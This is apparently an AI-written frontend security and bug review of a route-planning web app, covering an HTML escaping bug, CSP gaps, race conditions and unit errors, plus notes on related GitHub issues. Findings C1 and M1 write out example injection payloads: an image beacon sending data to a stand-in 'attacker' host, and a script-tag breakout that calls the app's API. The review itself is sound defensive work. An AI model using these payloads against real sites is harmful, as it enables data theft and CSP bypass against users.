# Frontend review: ride-optimizer (2026-11-08)

> **Follow-up (2026-11-10).** Each finding below has a status line added after the review: fixed (commit or PR), or the GitHub issue that tracks it. The rest of the text is the review as written on 2026-11-08; line numbers are as of that date and may have drifted. Remaining work is grouped under the epics #654 (Pi memory and compute), #662 (background jobs and thread safety), #669 (frontend correctness) and #676 (dead code, CI and structure).

Read-only review of `static/js/*.js`, `templates/**`, `static/*.html`, `static/css/main.css`, and the frontend/backend contract in `app/api/*_bp.py`.

**Baseline.** The local checkout is `main` at `092a305`. `origin/main` is 5 commits ahead (`0ccde24` polygon target area, `5d91dec` yard highlight, and docs). Those commits change only Explore files (`explore.js`, `explore-refine.js`, `exploration-worker.js`, `api-client.js`, `explore.html`). I re-checked every Explore finding against `origin/main` and all of them still apply. **Explore line numbers below are `origin/main` lines** (`explore.js` is now 2,940 lines). Line numbers for all other files are the same on both.

Severity scale: Critical means exploitable or data-destroying now. High means a core feature is broken or the loss is very likely. Med means a real bug with narrower impact. Low covers polish, dead code, and robustness.

---

## Critical

### C1. `escapeHtml()` does not escape `&`, `<` or `>`. Every "escaped" sink in the app is open to HTML injection

> **Status (2026-11-10):** Fixed in `374a850`.
- **Where:** `static/js/common.js:24-26`. Hex-dumped to confirm: the replacements are literally `"&"`, `"<"`, `">"` (bytes `22 3c 22`), not `&amp;`/`&lt;`/`&gt;`. Only the quote replacements work. It has been this way since the file was created (`git log -S'"&lt;"'` finds nothing).
- **Impact:** every caller passes untrusted text straight into `innerHTML`:
  - Strava route and activity names: `routes.js:292,450,637-639,706-707,588-596`, `route-detail.js:292,339-340,448`, `reports.js:240-248,362-367`, `compare.js:86,147`, `commute.js:128`, and the whole dashboard (`dashboard.js` `esc = window.escapeHtml` at 118, 169, 262, 316, 341, 457, 546, 755, 833, 934).
  - Toasts (`common.js:88`) and gear names.
  - **Ride-chat model output**: `report-chat.js:213` `renderMarkdown()` relies on `escapeHtml(text)` before it builds markup. Its comment says "nothing from the reply can inject markup", which is false. The model's reply is shaped by tool output over Strava activity names, so text injected through an activity name can surface as markup. The transcript is also replayed from `sessionStorage` on every render.
- **What CSP limits:** `script-src` has no `'unsafe-inline'`, so `<img onerror>` and `javascript:` URLs don't execute. Still allowed:
  - `img-src https:`: `<img src="https://attacker/?q=...">` beacons can exfiltrate data.
  - `style-src-attr 'unsafe-inline'`: lets injected content overlay and redress the UI.
  - Injected `<a>`/`<form>` elements, usable for phishing.
  - Broken layout from any name that contains `<`.
- **Fix:** use the real entities (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#039;`) and add a JS unit test next to `tests/js/` that asserts `escapeHtml('<b>&')` returns `&lt;b&gt;&amp;`. Then re-check `report-chat.js`'s inline regexes. They run after escaping, so they stay safe once escaping works.

---

## High

### H1. Swipe-to-navigate is attached to `document.body` and fires on map pans and horizontal scrolling (mobile)

> **Status (2026-11-10):** Fixed in `bf2f3d9` (also fixed #626).
- **Where:** `static/js/mobile.js:181-227`. `swipeContainer = document.querySelector('.container-fluid') || document.body`, and no template uses `.container-fluid`. Any touch that moves more than 50 px horizontally and less than 100 px vertically calls `navigateToNextTab()`/`navigateToPreviousTab()`, which sets `window.location.href`.
- **Scenario:** on Explore (page index 4), a rider pans the map left. Leaflet doesn't stop `touchend` bubbling, so the app navigates to Settings and the generated routes and coverage are lost. The same happens when scrolling the dashboard `.hourly-strip`, the Reports `table-responsive` tables, or the Routes map. The phone is the primary device, so this hits the main use case.
- **Fix:** ignore swipes whose `e.target.closest('.leaflet-container, .hourly-strip, .table-responsive, [data-no-swipe], input, textarea')` matches, or whose target has a horizontally scrollable ancestor. Alternatively, drop the feature: the bottom nav already covers navigation.

### H2. Explore: the `fitBounds` after generation (and route highlighting) reloads coverage, which wipes the new-tile highlights and rebuilds the whole grid

> **Status (2026-11-10):** Fixed in `bf2f3d9`.
- **Where:** `explore.js:409` (`map.on('zoomend moveend', … debouncedLoadCoverage)`), `loadCoverage()` at `1458-1459` (`newTilesLayer.clearLayers(); renderTiles(...)`), triggered by `map.fitBounds` at `1973` (generate done), `1772` (`highlightRoute`), `2142` (workout combo), `1214` (cached routes) and `map.setView` in search/geolocate.
- **Scenario:** a rider clicks Generate. Routes stream in with grey candidate zones, `done` calls `fitBounds`, and about 400 ms later `loadCoverage()` runs. Corridor boxes hit `_corridorCoverageCache`, so it resolves almost immediately and clears `newTilesLayer`, deleting every candidate zone. If Phase-2 auto-plot finishes first, it deletes the claimed (green) tiles too. Tapping a route badge (`highlightRoute` → `fitBounds`) does the same. Each reload also runs `renderTiles`, which since `5d91dec` includes `ExploreRefine.findYard()` on the main thread (`1612`) plus thousands of `L.rectangle`s. That cost is paid on every pan, which is janky on phones.
- **Fix:**
  - In loop/out-and-back and corridor modes, coverage doesn't depend on the viewport (see the comment at `loadCoverage` ~1370), so skip the `moveend` reload unless the request is in viewport mode.
  - In `loadCoverage`, only clear `newTilesLayer` and re-render tiles when the box set or zoom actually changed. A key built from the box list + zooms works.
  - Memoize `findYard` per `visited` object.

### H3. Explore "Workout combo" is broken: wrong distance units, its corridor constraint is ignored, and it can start from the wrong point

> **Status (2026-11-10):** Fixed in `bf2f3d9`.
- **Where:** `explore.js:2108` `workoutRoute.distance / 1000`. `/api/recommendation` already returns km: `commute_service.py:206` `'distance': rep.distance / 1000`, passed through at `commute_bp.py:237`. `exploration-worker.js:136` destructures `corridorConstraint` and never uses it.
- **Scenario:** a 15 km commute becomes a 0.015 km target. The worker's `reachRadius = 0.015/4` km, about 4 m, so the result is always "No nearby unvisited tiles found along the workout corridor". Even with the units fixed, the run is just a plain loop from the workout's first coordinate. The "constrain to the workout corridor" behaviour that the help text and #405 promise doesn't exist.
- **Also:** `explore.js:2106` sets the start only `if (!startMarker)`. When a start pin already exists elsewhere, the worker generates from the workout start, but `renderRoute()` (`2181`) and `plotRoadRoute()` draw and route from `startMarker`, so previews and road routes come out wrong.
- **Fix:**
  - Drop the `/1000`.
  - Implement `corridorConstraint` in the worker (filter `reachableTiles` to within `maxDetourKm` of the polyline) or hide the button.
  - Always move the start pin to the workout start, or pass the start position explicitly to the renderers.

### H4. Explore: overlapping worker runs and stale Phase-2 results. The protocol has no job ID, and the Generate button is re-enabled mid-run

> **Status (2026-11-10):** Fixed in `bf2f3d9`.
- **Where:**
  - `generateRoute()` disables the button, but `updateWorkflowState()` (`637`) sets `btn.disabled = !ready` and is called from `loadCoverage()`'s `finally`. H2 means that runs mid-generation.
  - `explorationWorker.onmessage` is reassigned per run (`1937`, `2123`), and the worker (`exploration-worker.js:61-66`) posts `route`/`done` with no run ID.
  - `plotRoadRoute()` (`2625`) has no generation token and no try/catch around non-`RouteError` failures.
- **Scenarios:**
  - **Generate re-enabled mid-run.** A coverage reload re-enables Generate while the worker is still busy, and the rider clicks again. The worker queues the second job, and the first job's late `route` messages land in the second run's handler. Result: mixed directions, a wrong `routeCount`, and `bestRoute` taken from the stale run.
  - **Stale Phase 2 after regenerate.** Phase 2 for the best route makes up to ~14 ORS calls. If the rider regenerates meanwhile, the old `plotRoadRoute` finishes and draws its polyline and claimed tiles into the new `routeLayer`/`newTilesLayer`, and overwrites `_phase2Polylines[dir]`.
  - **Button stuck on "Routing…".** A `TypeError` inside refinement (for example `startMarker` was cleared) becomes an unhandled rejection, and the button stays on "Routing…".
- **Fix:**
  - Add a `runId` to every worker request and response, and drop mismatched messages.
  - Keep a module-level `_generating` flag that `updateWorkflowState()` respects.
  - Capture a `generationId` in `plotRoadRoute` and bail before each DOM or map write if it has changed.
  - Wrap the body of `plotRoadRoute` in try/finally so the button always resets.

---

## Medium

### M1. Folium commute map: the nonce-stamping regex combined with an unescaped route name in the tooltip can bypass CSP *(Plausible)*

> **Status (2026-11-10):** Tooltip escaping fixed in `374a850` (`folium_escape`). Stamping nonces server-side instead of the regex rewrite: #681.
- **Where:** `commute.js` (map loader, ~line 243) rewrites the server HTML with `/<(script|style)(?![^>]*\bnonce=)/g` and stamps the page nonce onto *every* `<script` substring. `app/services/commute_service.py:316` builds `tooltip=f"{route_name} • …"` without `escape()`. The Home/Work popups do escape.
- **Scenario:** a route or activity name containing `</script><script>fetch('/api/…',{method:'POST'})</script>` ends the Folium script block early. The regex then gives the injected tag a valid nonce, so it executes in the blob iframe. That iframe has the app's origin, can reach the API, and can read the CSRF token. The threat model is mostly limited to the user's own Strava data, but this also defeats the CSP this codebase worked hard to tighten (#475).
- **Fix:** `escape(route_name)` at `commute_service.py:316` (and anywhere else Folium gets free text: `planner_service.py:1165`, `src/visualizer.py:254`). In `commute.js`, only stamp tags that appear outside Folium-generated text, or better, stamp nonces server-side in the template before JS ever sees the HTML.

### M2. `routes.js` tooltip renders `route.name` as HTML

> **Status (2026-11-10):** Fixed in `374a850`.
- **Where:** `routes.js:295` `polyline.bindTooltip(route.name, …)`. Leaflet's DivOverlay sets string content with `innerHTML`.
- **Fix:** `bindTooltip(escapeHtml(route.name))` (after C1), or pass a text node.

### M3. `routes.js` toggle/fit races leave orphaned polylines on the map

> **Status (2026-11-10):** #670.
- **Where:** `toggleRouteOnMap()` `routes.js:222-345`, `fitAllRoutes()` `423-496`.
- **Scenario:** a double tap on a route card starts two `getRouteDetails` awaits before `displayedRoutes.has(id)` becomes true. Both add a polyline plus 2 markers, and the second `set()` overwrites the first, so the first set of layers can no longer be removed (Clear and toggle miss them). Clicking "Show all" twice, or during a toggle, does the same thing in bulk. That leaks DOM/SVG and leaves stale lines.
- **Fix:** keep a `pending` Set of route IDs and early-return when the ID is in it. Re-check `displayedRoutes.has(id)` after the await.

### M4. Stale responses overwrite newer ones on Reports and in the Routes "uses" modal

> **Status (2026-11-10):** #670.
- **Where:**
  - `reports.js:28-37` (period buttons call `loadStats()`/`loadActivities()` with no request ID).
  - `reports.js:312-313` (filter changes).
  - `reports.js:432-445` (calendar prev/next).
  - `routes.js:541-616` (uses modal).
- **Scenarios:**
  - Tapping "This year" then "All time" quickly: the slower response wins, so the headline numbers and the activity table can show different periods while the "All time" button is active.
  - Fast calendar paging renders an earlier month under the current month's heading.
  - Opening the uses modal for route A, closing it and opening route B shows A's activities under B's title.
- **Fix:** a per-loader `let seq = 0; const my = ++seq; … if (my !== seq) return;` (the same pattern as `_coverageRequestId` in `explore.js`), or `AbortController`.

### M5. `api-client.js` retries non-idempotent POSTs and builds one CSRF fetch per instance

> **Status (2026-11-10):** #671.
- **Where:** `api-client.js:62-210`. The retry loop retries timeouts (AbortError), network errors and 502/503/504 for every method. Only 4xx/500 fail fast.
- **Scenarios:**
  - `POST /analyze` (`triggerAnalysis`) or `POST /plans` (`savePlan`) times out at 10 s while the server is still working, so the retry starts a second analysis job or saves a duplicate plan.
  - `POST /exploration/route` (60 s timeout × 3 attempts plus backoff) can burn up to 3 ORS calls per logical call against the 20/min limit and the daily quota.
- Separately, each `new APIClient()` fetches `/api/csrf-token` in its constructor. Explore makes 2 instances and Reports makes 3 (`api-client.js:529`, `explore.js:11`, `reports.js:5`, `report-chat.js:17`), so every page view makes redundant requests to the Pi.
- **Fix:** default `maxAttempts: 1` for mutations unless the caller opts in. Use `window.apiClient` everywhere instead of new instances, or share one CSRF promise across instances.

### M6. Units ignore the user's metric/imperial setting on most pages

> **Status (2026-11-10):** #672.
The default is imperial, and `getUnitSystem()` exists. Hard-coded units:
- `dashboard.js:467-480` (°F, mph), `dashboard.js:944-950` hourly strip (`temp_f`, `wind_speed_mph`), `dashboard.js:225` group ride "~X mi".
- `weather.js:41-51,63-80,139-170` (all °F/mph).
- `reports.js:57-58,77-79,118-131,371-375,470` (mph, ft and mi on records, activity table and calendar titles), even though headline distance *is* converted (`reports.js:69-75`).
- `route-detail.js:173` speed chart in km/h.
- `exploration-worker.js:235` wind label in km/h.

A metric user sees a mix on one screen. **Fix:** route every display through `formatDistance`/`formatSpeed`/`formatTemperature`/`formatElevation`, or have the API return SI units only and convert client-side.

### M7. Settings: the intervals.icu and ORS disconnect buttons stack duplicate listeners

> **Status (2026-11-10):** #673.
- **Where:** `settings.js:596-606` and `683-693`. `loadIcuStatus()`/`loadOrsStatus()` add a `{ once: true }` click listener on each call and are re-called after every successful connect or save (`647`, `726`). `once` only removes a listener after it fires, so unfired listeners pile up.
- **Scenario:** connect intervals.icu, then click Disconnect. The confirm dialog appears twice and two `POST /intervals/disconnect` requests go out. **Fix:** bind once at init with a named handler, as the file already does for `connectIcu`/`saveOrsKey` (see the comment at `settings.js:611`).

### M8. Explore rectangle drawing is mouse-only and freezes the map on touch

> **Status (2026-11-10):** #674.
- **Where:** `explore.js:352-383` (`mousedown`/`mousemove`/`mouseup`); `setDrawAreaMode('rect')` calls `map.dragging.disable()`.
- **Scenario:** on a phone, tapping "Rectangle" then dragging pans nothing (dragging is off) and draws nothing (touch moves produce no `mousemove`). Polygon mode (`0ccde24`) works with taps, so a workaround exists, but Rectangle looks broken. **Fix:** use Leaflet's pointer-aware events, or hide or relabel Rectangle on `isTouchDevice` and point to Polygon.

### M9. Explore in-memory coverage caches have no size limit

> **Status (2026-11-10):** #661.
- **Where:** `explore.js:114` `_corridorCoverageCache`, `_corridorRoadlessCache`. Keys are exact box coordinates, and every pin move or distance change makes new boxes. Each entry holds a full `visited` dict, which can be MBs at zoom 17.
- **Scenario:** a long planning session on a phone grows memory until the tab is evicted. **Fix:** an LRU capped at about 30 entries.

### M10. Static asset caching and versioning

> **Status (2026-11-10):** SRI hashes added in `c1fa669`. Content-hash versioning and `max_age`: #660.
- `send_from_directory` (`app/factory.py:169`) doesn't set `max_age`, so every JS/CSS file revalidates on each page load (about 10-15 conditional requests to the Pi per navigation).
- Versioning is inconsistent:
  - Versioned: `api-client.js?v=8`, `explore.js?v=11`, `explore-refine.js?v=3`, worker `?v=5`.
  - Unversioned: `common.js`, `mobile.js`, `main.css`, `pages/*.css`.
  - So adding a `max_age` today would serve stale copies of the unversioned files.
- CDN assets (Bootstrap 5.3.0, Leaflet 1.9.4, bootstrap-icons) have no `integrity` (SRI).
- **Fix:** derive a content-hash or app-version query string in Jinja for every local asset, then set a long `max_age` for versioned paths. Add SRI hashes to the CDN tags.

### M11. `getUnitSystem()` throws on corrupt localStorage, which breaks every formatter

> **Status (2026-11-10):** #672.
- **Where:** `common.js` `getUnitSystem()` calls `JSON.parse(localStorage.getItem(...))` without try/catch. Every `formatDistance`/`formatSpeed`/… call goes through it. `localStorage` access itself throws in some privacy modes. (`dashboard.js` "What's New" (`~985`) also uses unguarded `localStorage`.)
- **Fix:** wrap it in try/catch and default to imperial.

---

## Low

- **L1. Calendar "today" uses the UTC date.** `reports.js:455` `new Date().toISOString().slice(0,10)`. After about 18:00 Central the next day is highlighted. Build the date from local components instead.
  - *Status (2026-11-10):* #675.
- **L2. `updateAllTimestamps()` damages the labels it refreshes.** `common.js` (`prefix = textContent.split(' ')[0]`). Dashboard's element starts with whitespace and Routes' with an icon, so after one minute "Synced 5 minutes ago" becomes " 6 minutes ago" and the clock icon disappears. Store the prefix in a `data-` attribute.
  - *Status (2026-11-10):* #675.
- **L3. A condition score of 0 renders as "Good".** `dashboard.js:757` `route.condition_score || 75`. Use `?? 75`.
  - *Status (2026-11-10):* #675.
- **L4. Keyboard accessibility gaps.**
  - *Status (2026-11-10):* #675.
  - Workout option cards (`dashboard.js:192-245`) are `role="button" tabindex="0"` with a click handler but no Enter/Space handler.
  - The Routes card (`routes.js:684-760`) is `role="button"` and contains a checkbox and another `role="button"` span. Nested interactive controls confuse screen readers.
- **L5. Bootstrap modal instances pile up.** `routes.js:559` creates `new bootstrap.Modal(modalEl)` on every open. Use `getOrCreateInstance`.
  - *Status (2026-11-10):* #675.
- **L6. Settings inserts server strings without escaping.** `settings.js:581, 645, 651, 655, 730, 734, 970, 974, 1000, 1751, 1760, 1764` put `res.error`, `e.message` and `athlete_name` into `innerHTML` unescaped. Other blocks in the same file do escape.
  - *Status (2026-11-10):* Fixed in `374a850`.
- **L7. GPX downloads may not start on iOS.** `explore.js:2922` revokes the object URL synchronously after `a.click()`. Some iOS Safari versions then cancel the download. Revoke in a `setTimeout`.
  - *Status (2026-11-10):* #675.
- **L8. Unused code and stale docs.**
  - *Status (2026-11-10):* Unused code and the stale toast: #675. °F thresholds in `getWeatherSeverity`: #672. CLAUDE.md drift: #678.
  - `plotRoadRoute` still carries the short/long variant scaffolding (`singleRoute = true`, `shortOutcome` always null, a "(−)" label path that's never used).
  - `getWeatherSeverity` uses °F thresholds.
  - The "What's New v0.17.0" toast is stale.
  - About 35 CSS classes in `main.css` are unused:
    - `skeleton-*` (11)
    - `route-card-compact-*` (6), `route-card-header/stats/title`, `route-stat-*`
    - `home-compact-info-bar`, `home-recent-routes`
    - `loading-overlay/spinner`, `conditions-*`
    - `card-interactive`, `alert-error`, `legend-swatch-caution`
  - CLAUDE.md says no page uses the Planner API, but `dashboard.js:864` (#596) does.
- **L9. Unchecked `postMessage` input.** `commute.js:29-38` doesn't check `event.origin`, and it puts `event.data.direction` into a `querySelector` selector.
  - *Status (2026-11-10):* Fixed in `374a850` (checks `event.source` and accepts only known directions).
- **L10. Deprecated OSM tile URL.** `explore.js` and `route-detail.js` use the OSM `{s}.tile.openstreetmap.org` subdomain form, which OSM has deprecated. Use `tile.openstreetmap.org`.
  - *Status (2026-11-10):* #675.
- **L11. The dashboard refresh can overlap and resets the UI.** The 5-minute refresh (`dashboard.js:960-975`) has no in-flight guard, and a full re-render collapses whatever the rider had expanded (compare panel, route status).
  - *Status (2026-11-10):* #675.
- **L12. ORS budget per plot is tight.** Explore Phase 2 can use about 14 ORS calls per plot (1 + 3 trim + 2 pickup + 1 useless-stop + 1 retrace + 4 sweep + 1 cleanup) against a 20/min limit. With M5's retries, two quick re-plots hit 429s. Worth a visible "routing budget" or fewer sweep rounds on mobile.
  - *Status (2026-11-10):* #675.

---

## Release issue review

All writes were made with `gh` on 2026-11-08. No issue was closed, and no labels, milestones, priorities or assignees were changed.

- **#633: Data Cleanup review & approve page.** Not started: no `cleanup.html`, `cleanup.js` or Blueprint in the tree. Comment posted with implementation notes:
  - nav/drawer wiring (`partials/nav.html`, `mobile.js` `DRAWER_ITEMS`/`PAGE_ROUTES`)
  - C1 escapeHtml as a hard prerequisite
  - H1 swipe navigation conflicting with tabs and cards
  - reuse `pollJob`/`renderErrorStateInto`
  - tabs vs mobile
  - size estimate
- **#634: Strava manual workflow.** Not started. Comment posted:
  - shares the card component with #633
  - mobile deep link to the Strava app
  - store marks server-side through JSONStorage, not in localStorage
  - undo handling
  - suggests sequencing after #633
- **#592: RWGPS suggested vs original route on Explore.** Not started, and blocked on #591 (open). **Body edited:** appended a frontend-review section. The backend-review note says `renderVariant` already draws two routes at once, which is out of date. The short/long split was removed, so `plotRoadRoute` draws one route and the second-route path is dead scaffolding. The section also adds a file-placement requirement (a new module, not `explore.js`) and flags H2/H4 as prerequisites.
- **#637 (UI side only): display yard/übersquadrat.** Partly done on `origin/main` (`5d91dec`): the yard and yardinho are highlighted on the map with a legend, computed client-side by `ExploreRefine.findYard`. Still missing: übersquadrat, numeric display, and a toggleable layer. The client yard is computed from the bbox- or radius-clipped coverage window, so it can't match squadrats.com, and it is recomputed on the main thread every pan (H2). Comment posted asking the UI to switch to the backend endpoint once it exists.
- **#638: Grow übersquadrat mode.** Not started (depends on #637). Comment posted:
  - worker protocol changes (mandatory target set, run IDs per H4)
  - where the code should live (`explore-refine.js`/worker, not `explore.js`)
  - mobile UX for cycling candidates
  - interaction with drawn area and water exclusion
- **#639: Grow yard mode.** Not started (depends on #637). Comment posted:
  - reuse `ExploreRefine.findYard` as the reference for the property test
  - incremental gain in the worker
  - preview-overlay performance via the canvas renderer
  - a recommendation on frontier/infill help text
- **#640: yard/übersquadrat deltas on route cards.** Not started (depends on #637). **Body edited:** "every generated route card" conflicts with "from the final road route's tiles". Only the auto-plotted best route gets a road route; the other directions stay Phase-1 previews until the rider taps "Plot road route". The appended section sets acceptance for the unplotted cards, card density on mobile, and the clipped-window caveat.

*Automated review by Claude.*
